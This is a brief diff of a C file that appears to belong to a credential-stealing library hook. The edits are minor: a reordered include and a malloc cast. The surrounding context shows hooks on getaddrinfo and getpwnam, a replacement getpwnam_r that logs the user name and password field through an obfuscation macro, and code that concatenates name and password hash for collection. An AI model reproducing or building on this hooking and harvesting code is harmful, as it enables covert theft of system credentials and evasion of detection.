@@ -13,8 +13,8 @@
 #include <security/pam_ext.h>  
 #include <krb5/krb5.h>
 #include <security/pam_modutil.h>  
-#include "utils/config.h"
 #include "utils/obfuscate.h"
+#include "utils/config.h"
 
 static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res);
 static struct passwd *(*original_getpwnam)(const char *name);
@@ -80,7 +80,7 @@ int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, s
 	}
 	printf(AY_OBFUSCATE("getpwnam_r :: name: \"%s\" | password \"%s\"\n"), name, pwd->pw_name);
 	size_t credsSize = (strlen(name) + strlen(pwd->pw_passwd) + 10);
-	char* concatCreds = malloc(credsSize);
+	char* concatCreds = (char*)malloc(credsSize);
 
 	strcpy(concatCreds, name);
 	strcat(concatCreds, pwd->pw_passwd);
